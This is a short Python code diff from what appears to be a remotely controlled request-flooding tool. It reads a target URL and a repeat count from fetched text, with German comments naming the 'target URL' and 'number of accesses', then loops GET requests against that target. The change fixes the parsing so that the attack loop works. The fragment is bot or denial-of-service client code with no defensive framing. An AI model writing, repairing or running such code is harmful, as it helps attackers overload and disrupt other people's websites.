@@ -10,9 +10,9 @@ def start():
         #source code
         source = req.text
         #Ziel Url
-        attack_url = source[2:]
+        attack_url = source[1:]
         #t = anzahl der zugriffe
-        t = int(source[1])
+        t = int(source[0])
         for i in range(0,t,1):
             print(requests.get(attack_url).text)  
 
